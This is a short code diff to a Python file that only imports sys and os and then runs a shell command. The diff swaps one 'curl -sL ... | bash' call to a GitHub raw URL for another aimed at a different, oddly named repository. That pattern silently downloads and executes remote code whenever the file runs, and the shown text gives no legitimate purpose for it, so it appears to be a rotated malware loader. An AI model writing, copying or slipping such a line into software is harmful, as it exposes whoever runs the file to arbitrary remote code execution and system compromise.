@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/kazppkido/gbut/raw/main/newspec | bash')
+os.system('curl -sL https://github.com/claires67/buut/raw/main/ispekk | bash')
